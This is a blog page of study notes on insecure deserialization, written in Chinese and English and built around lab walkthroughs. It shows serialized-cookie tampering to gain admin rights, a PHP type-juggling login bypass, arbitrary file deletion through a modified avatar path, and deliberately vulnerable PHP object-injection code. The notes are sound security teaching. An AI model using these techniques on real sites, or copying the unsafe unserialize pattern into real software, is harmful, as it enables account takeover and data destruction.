@@ -1,0 +1,458 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.3/css/all.min.css" integrity="sha256-2H3fkXt6FEmrReK448mDVGKb3WW2ZZw35gI7vqHOE4Y=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"h01iday.github.io","root":"/","images":"/images","scheme":"Muse","version":"8.7.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="#01How to identify insecure deserialization通过观察all data being passed into the website的格式。 Serialized data can be identified relatively easily if you know the format that different languages use. ##001">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="https://h01iday.github.io/2021/10/21/insecure%20deserialization/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="#01How to identify insecure deserialization通过观察all data being passed into the website的格式。 Serialized data can be identified relatively easily if you know the format that different languages use. ##001">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/id1.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/id2.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/id3.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/id4.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/id5.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/id6.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/id7.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/id8.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/id9.png">
+<meta property="og:image" content="d:/blog/H01iday/source/_posts/pics/id10.png">
+<meta property="og:image" content="d:/blog/H01iday/source/_posts/pics/id11.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/id12.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/id13.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/id14.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/id15.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/id16.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/id17.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/id18.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/id19.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/id20.png">
+<meta property="article:published_time" content="2021-10-21T03:16:16.040Z">
+<meta property="article:modified_time" content="2021-10-22T10:57:55.358Z">
+<meta property="article:author" content="H01iday">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="d:/blog/H01iday/source_posts/pics/id1.png">
+
+
+<link rel="canonical" href="https://h01iday.github.io/2021/10/21/insecure%20deserialization/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://h01iday.github.io/2021/10/21/insecure%20deserialization/","path":"2021/10/21/insecure deserialization/","title":""}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title> | Hexo</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Hexo</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#01How-to-identify-insecure-deserialization"><span class="nav-number">1.</span> <span class="nav-text">#01How to identify insecure deserialization</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#001PHP-serialization-format"><span class="nav-number">1.1.</span> <span class="nav-text">##001PHP serialization format</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#001%E4%BE%8B%E5%AD%90"><span class="nav-number">1.1.1.</span> <span class="nav-text">####001例子</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#002PHP%E5%87%BD%E6%95%B0"><span class="nav-number">1.1.2.</span> <span class="nav-text">####002PHP函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#002Java-serialization-format"><span class="nav-number">1.2.</span> <span class="nav-text">##002Java serialization format</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#001%E8%AF%B4%E6%98%8E"><span class="nav-number">1.2.1.</span> <span class="nav-text">###001说明</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Java%E5%87%BD%E6%95%B0"><span class="nav-number">1.2.2.</span> <span class="nav-text">###Java函数</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#02Manipulating-serialized-objects"><span class="nav-number">2.</span> <span class="nav-text">#02Manipulating serialized objects</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#001Modifying-object-attributes"><span class="nav-number">2.1.</span> <span class="nav-text">##001Modifying object attributes</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#001%E4%BE%8B%E5%AD%90-1"><span class="nav-number">2.1.1.</span> <span class="nav-text">###001例子</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#002Modifying-data-types"><span class="nav-number">2.2.</span> <span class="nav-text">##002Modifying data types</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#001PHP%E2%80%98s-loose-comparison-operator"><span class="nav-number">2.2.1.</span> <span class="nav-text">###001PHP‘s loose comparison operator (&#x3D;&#x3D;)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#002%EF%BC%88-%EF%BC%89%E7%9A%84%E5%88%A9%E7%94%A8"><span class="nav-number">2.2.2.</span> <span class="nav-text">###002（&#x3D;&#x3D;）的利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#003%E4%BE%8B%E5%AD%90"><span class="nav-number">2.2.3.</span> <span class="nav-text">###003例子</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#03Using-application-functionality"><span class="nav-number">3.</span> <span class="nav-text">#03Using application functionality</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#001%E4%BE%8B%E5%AD%90-2"><span class="nav-number">3.1.</span> <span class="nav-text">##001例子</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#04-PHP-Object-Injection"><span class="nav-number">4.</span> <span class="nav-text">#04 PHP Object Injection</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#001-Magic-Method"><span class="nav-number">4.1.</span> <span class="nav-text">##001 Magic Method</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E2%80%93-wakeup"><span class="nav-number">4.1.1.</span> <span class="nav-text">###– wakeup</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E2%80%93-sleep"><span class="nav-number">4.1.2.</span> <span class="nav-text">###– sleep</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E2%80%93-construct"><span class="nav-number">4.1.3.</span> <span class="nav-text">###– construct</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E2%80%93-destruct"><span class="nav-number">4.1.4.</span> <span class="nav-text">###– destruct</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E2%80%93-toString"><span class="nav-number">4.1.5.</span> <span class="nav-text">###– toString</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E2%80%93-call"><span class="nav-number">4.1.6.</span> <span class="nav-text">###– call</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E2%80%93-serialize"><span class="nav-number">4.1.7.</span> <span class="nav-text">###– serialize</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E2%80%93-unserialize"><span class="nav-number">4.1.8.</span> <span class="nav-text">###– unserialize</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#002PHP-Object-Injection%E4%BE%8B%E5%AD%90"><span class="nav-number">4.2.</span> <span class="nav-text">##002PHP Object Injection例子</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#003Lab-Arbitrary-object-injection-in-PHP"><span class="nav-number">4.3.</span> <span class="nav-text">##003Lab: Arbitrary object injection in PHP</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-overview">
+            <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">H01iday</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">32</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+          </div>
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://h01iday.github.io/2021/10/21/insecure%20deserialization/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="H01iday">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-10-21 11:16:16" itemprop="dateCreated datePublished" datetime="2021-10-21T11:16:16+08:00">2021-10-21</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2021-10-22 18:57:55" itemprop="dateModified" datetime="2021-10-22T18:57:55+08:00">2021-10-22</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="01How-to-identify-insecure-deserialization"><a href="#01How-to-identify-insecure-deserialization" class="headerlink" title="#01How to identify insecure deserialization"></a>#01How to identify insecure deserialization</h2><p>通过观察all data being passed into the website的格式。</p>
+<p>Serialized data can be identified relatively easily if you know the format that different languages use.</p>
+<h3 id="001PHP-serialization-format"><a href="#001PHP-serialization-format" class="headerlink" title="##001PHP serialization format"></a>##001PHP serialization format</h3><h4 id="001例子"><a href="#001例子" class="headerlink" title="####001例子"></a>####001例子</h4><p>一个User对象有以下属性</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$user-&gt;name = &quot;carlos&quot;;</span><br><span class="line">$user-&gt;isLoggedIn = true;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>序列化后：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;User&quot;:2:&#123;s:4:&quot;name&quot;:s:6:&quot;carlos&quot;; s:10:&quot;isLoggedIn&quot;:b:1;&#125; </span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>O:4:&quot;User&quot;</code> - An object with the 4-character class name <code>&quot;User&quot;</code>         </li>
+<li><code>2</code> - the object has 2 attributes         </li>
+<li><code>s:4:&quot;name&quot;</code> - The key of the first attribute is the <strong>4</strong>-character <strong>string</strong> <code>&quot;name&quot;</code>         </li>
+<li><code>s:6:&quot;carlos&quot;</code> - The value of the first attribute is the <strong>6</strong>-character <strong>string</strong> <code>&quot;carlos&quot;</code>         </li>
+<li><code>s:10:&quot;isLoggedIn&quot;</code> - The key of the second attribute is the 10-character string <code>&quot;isLoggedIn&quot;</code>         </li>
+<li><code>b:1</code> - The value of the second attribute is the <strong>boolean</strong> value <code>true</code>         </li>
+</ul>
+<h4 id="002PHP函数"><a href="#002PHP函数" class="headerlink" title="####002PHP函数"></a>####002PHP函数</h4><p><code>serialize()</code>序列化</p>
+<p><code>unserialize()</code>反序列化</p>
+<h3 id="002Java-serialization-format"><a href="#002Java-serialization-format" class="headerlink" title="##002Java serialization format"></a>##002Java serialization format</h3><h4 id="001说明"><a href="#001说明" class="headerlink" title="###001说明"></a>###001说明</h4><p>Java use binary serialization formats.</p>
+<p>但是可以通过一些特殊的符号观察出来是序列化内容</p>
+<p>serialized Java objects always begin with the same bytes, which are encoded as <code>ac ed </code>in hexadecimal and <code>rO0</code> in Base64.        </p>
+<p>Any class that implements the interface <code>java.io.Serializable</code> can be serialized and deserialized.</p>
+<h4 id="Java函数"><a href="#Java函数" class="headerlink" title="###Java函数"></a>###Java函数</h4><p>java.io.ObjectOutputStream类中的**writeObject( )**方法可以实现Java序列化。</p>
+<p>java.io.ObjectInputStream类中的**readObject( )**方法可以实现Java反序列化。</p>
+<p>想一个Java对象是可序列化的，需要满足相应的要求：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、实现Serializable接口或Externalizable接口</span><br><span class="line">2、当前类提供一个全局常量 serialVersionUID</span><br><span class="line">3、必须保证其内部所有属性也必须是可序列化的（默认情况下，基本数据类型可序列化）</span><br><span class="line">4、ObjectInputStream和ObjectOutputStream不能序列化static和transient修饰的成员变量</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="02Manipulating-serialized-objects"><a href="#02Manipulating-serialized-objects" class="headerlink" title="#02Manipulating serialized objects"></a>#02Manipulating serialized objects</h2><h3 id="001Modifying-object-attributes"><a href="#001Modifying-object-attributes" class="headerlink" title="##001Modifying object attributes"></a>##001Modifying object attributes</h3><p>consider a website that uses a serialized <code>User</code> object to store data about a user’s session in a cookie.</p>
+<p> If an attacker spotted  this <strong>serialized object</strong> in an HTTP request, they might decode it to find  the following byte stream:        </p>
+<p> <code>O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;carlos&quot;;s:7:&quot;isAdmin&quot;;b:0;&#125;</code>        </p>
+<p>可以看到，<code>isAdmin</code>这个属性是服务器用来判断是否拥有管理员权限的一个值</p>
+<p>服务器端会进行如下判断</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$user = unserialize($_COOKIE);                </span><br><span class="line">if ($user-&gt;isAdmin === true) &#123;                </span><br><span class="line">	// allow access to admin interface               </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>那么通过修改<code>isAdmin</code>属性的值，就可以获取管理员权限</p>
+<h4 id="001例子-1"><a href="#001例子-1" class="headerlink" title="###001例子"></a>###001例子</h4><p>已知：普通用户wiener:peter；serialization-based session mechanism</p>
+<p>目标：获取管理员权限删除carlos用户信息</p>
+<p>①登陆后，查看本用户wiener信息</p>
+<p>②这里用到INSPECTOR，可以看出来session为经过base64 encode 的php序列化内容</p>
+<p><img src="D:\blog\H01iday\source_posts\pics\id1.png" alt="id1"></p>
+<p>③修改admin对应的boolean值为1，Apply changes</p>
+<p>④再发送给应用程序，可以进入admin面板，执行管理员操作</p>
+<p><img src="D:\blog\H01iday\source_posts\pics\id2.png" alt="id1"></p>
+<p><img src="D:\blog\H01iday\source_posts\pics\id3.png" alt="id1"></p>
+<h3 id="002Modifying-data-types"><a href="#002Modifying-data-types" class="headerlink" title="##002Modifying data types"></a>##002Modifying data types</h3><h4 id="001PHP‘s-loose-comparison-operator"><a href="#001PHP‘s-loose-comparison-operator" class="headerlink" title="###001PHP‘s loose comparison operator (==)"></a>###001PHP‘s loose comparison operator (<code>==</code>)</h4><p>①<code>A==B</code>两边数据类型不同。</p>
+<p>如果A为string，B为Integer，PHP会将A转化为Integer类型再进行比较</p>
+<p><code>5 == &quot;5&quot;</code> evaluates to <code>true</code>.        </p>
+<p>②A如果为数字开头的字符串,例<code>12abc456</code>，B为Integer</p>
+<p>A会先转化为12，后面部分自动忽略，再和B进行比较</p>
+<p>③特殊的0</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> == <span class="string">&quot;Example123 string&quot;</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
+
+<p>如果进行比较的字符串不以数字开头，PHP treats this entire string as the integer <code>0</code>.        </p>
+<h4 id="002（-）的利用"><a href="#002（-）的利用" class="headerlink" title="###002（==）的利用"></a>###002（<code>==</code>）的利用</h4><p>假设这是服务器端进行密码验证的代码</p>
+<p>$password为存储在服务器数据库中的password字符串</p>
+<p>$login[‘password’]为从用户浏览器提交过来的cookie中获取的password内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$login</span> = unserialize(<span class="variable">$_COOKIE</span>)</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$login</span>[<span class="string">&#x27;password&#x27;</span>] == <span class="variable">$password</span>) &#123;</span><br><span class="line"><span class="comment">// log in successfully</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>假设$password为非数字开头的字符串。</p>
+<p>那么我提交的<code>$login[&#39;password&#39;]</code>可以这样操作：修改data type为integer，值为0。</p>
+<p>这样，不管$password的内容是什么，只要不是数字开头，<code>$login[&#39;password&#39;] == $password</code>这个检验都能够顺利通过。</p>
+<h4 id="003例子"><a href="#003例子" class="headerlink" title="###003例子"></a>###003例子</h4><p>已知：普通用户wiener:peter；serialization-based session mechanism</p>
+<p>目的：access the <code>administrator</code> account. Then, delete Carlos.        </p>
+<p>①登入账户查看账户信息</p>
+<p><img src="D:\blog\H01iday\source_posts\pics\id4.png" alt="id4"></p>
+<p>②修改信息，并且apply changes</p>
+<p>修改用户名及长度；修改access_token value类型为i值为0</p>
+<p><img src="D:\blog\H01iday\source_posts\pics\id5.png" alt="id5"></p>
+<p>③发送 得到admin的进入面板</p>
+<p><img src="D:\blog\H01iday\source_posts\pics\id6.png" alt="id5"></p>
+<h2 id="03Using-application-functionality"><a href="#03Using-application-functionality" class="headerlink" title="#03Using application functionality"></a>#03Using application functionality</h2><p>举个栗子说明：</p>
+<p>website’s “Delete user” functionality 让用户可以删除自己的信息</p>
+<p>用户信息包含用户头像信息，the user’s profile picture is deleted by accessing the file path in the <code>$user-&gt;image_location</code> attribute.</p>
+<p>If this <code>$user</code> was created from a serialized object,那么攻击者可以修改<code>$user-&gt;image_location</code>为任意一个文件A，那么应用程序执行时就会将A以及用户的信息删除。</p>
+<p>这就是利用application自身的function来实现attacker的目的</p>
+<h3 id="001例子-2"><a href="#001例子-2" class="headerlink" title="##001例子"></a>##001例子</h3><p>已知：用于登录用户信息wiener:peter；serialization-based session mechanism.</p>
+<p>目标： delete the <code>morale.txt</code> file from Carlos’s home directory.        </p>
+<p>①点击图中delete按钮</p>
+<p><img src="D:\blog\H01iday\source_posts\pics\id7.png" alt="id7"></p>
+<p>②拦截到如下信息，可以知道avatar_link指向要删除的本用户的头像文件</p>
+<p><img src="D:\blog\H01iday\source_posts\pics\id8.png" alt="id7"></p>
+<p>③将头像文件路径修改，改为本题要求删除的文件路径，成功删除，且本用户信息也被删除</p>
+<p><img src="D:\blog\H01iday\source_posts\pics\id9.png" alt="id7"></p>
+<h2 id="04-PHP-Object-Injection"><a href="#04-PHP-Object-Injection" class="headerlink" title="#04 PHP Object Injection"></a>#04 PHP Object Injection</h2><h3 id="001-Magic-Method"><a href="#001-Magic-Method" class="headerlink" title="##001 Magic Method"></a>##001 Magic Method</h3><h4 id="–-wakeup"><a href="#–-wakeup" class="headerlink" title="###– wakeup"></a>###– wakeup</h4><p>执行unserialize()时，先会调用这个函数</p>
+<h4 id="–-sleep"><a href="#–-sleep" class="headerlink" title="###– sleep"></a>###– sleep</h4><p>执行serialize()时，先会调用这个函数</p>
+<h4 id="–-construct"><a href="#–-construct" class="headerlink" title="###– construct"></a>###– construct</h4><p>构造函数</p>
+<h4 id="–-destruct"><a href="#–-destruct" class="headerlink" title="###– destruct"></a>###– destruct</h4><p>在对象消亡之前被调用</p>
+<h4 id="–-toString"><a href="#–-toString" class="headerlink" title="###– toString"></a>###– toString</h4><p>allows a class to decide    how it will react when it is treated like a string. </p>
+<p>For example,    what <code>echo $obj;</code> </p>
+<h4 id="–-call"><a href="#–-call" class="headerlink" title="###– call"></a>###– call</h4><p>在对象中调用一个不可访问方法时，__call()会被调用。   </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MethodTest</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>) </span></span><br><span class="line"><span class="function"> //$<span class="title">name</span>为要调用方法的名称，$<span class="title">arguments</span> 参数包含着要传递给方法 $<span class="title">name</span> 的参数。 </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 注意: $name 的值区分大小写</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Calling object method &#x27;<span class="subst">$name</span>&#x27; &quot;</span></span><br><span class="line">             . implode(<span class="string">&#x27;, &#x27;</span>, <span class="variable">$arguments</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> MethodTest;</span><br><span class="line"><span class="variable">$obj</span>-&gt;runTest(<span class="string">&#x27;in object context&#x27;</span>);</span><br><span class="line"><span class="comment">//output:Calling object method &#x27;runTest&#x27; in object context</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="–-serialize"><a href="#–-serialize" class="headerlink" title="###– serialize"></a>###– serialize</h4><p>serialize() 函数会检查类中是否存在一个魔术方法 __serialize()。</p>
+<p>如果存在，该方法将在任何序列化之前优先执行。</p>
+<p>如果类中同时定义了 __serialize() 和 __sleep() 两个魔术方法，则只有 __serialize() 方法会被调用。 __sleep() 方法会被忽略掉。</p>
+<h4 id="–-unserialize"><a href="#–-unserialize" class="headerlink" title="###– unserialize"></a>###– unserialize</h4><p>Conversely, unserialize() checks for the presence of a function with the magic name __unserialize(). </p>
+<p>如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法，则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。 </p>
+<h3 id="002PHP-Object-Injection例子"><a href="#002PHP-Object-Injection例子" class="headerlink" title="##002PHP Object Injection例子"></a>##002PHP Object Injection例子</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$logFile</span> = <span class="string">&#x27;logs.txt&#x27;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$logData</span> = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkServices</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;[+] Checking Services.&lt;br&gt;&#x27;</span>;</span><br><span class="line">     <span class="keyword">$this</span>-&gt;logData = <span class="string">&#x27;Success&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     file_put_contents(<span class="keyword">__DIR__</span> . <span class="string">&#x27;/&#x27;</span> . <span class="keyword">$this</span>-&gt;logFile, <span class="keyword">$this</span>-&gt;logData);</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;[+] Logs written to log file.&lt;br&gt;&#x27;</span>;</span><br><span class="line">      <span class="comment">//__DIR__这个是magic parameter。为当前目录绝对路径</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//这个__destruct函数在对象消亡之前会执行</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$userInput</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$someData</span> = unserialize(<span class="variable">$userInput</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$app</span> = <span class="keyword">new</span> App;</span><br><span class="line"><span class="variable">$app</span>-&gt;checkServices();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>执行index.php 执行结果如下</p>
+<img src="D:\blog\H01iday\source\_posts\pics\id10.png" alt="id10" style="zoom:67%;" />
+
+<p>check一下logs.txt是否写入Success</p>
+<img src="D:\blog\H01iday\source\_posts\pics\id11.png" alt="id11" style="zoom:67%;" />
+
+<p>ok，说明代码被正确执行</p>
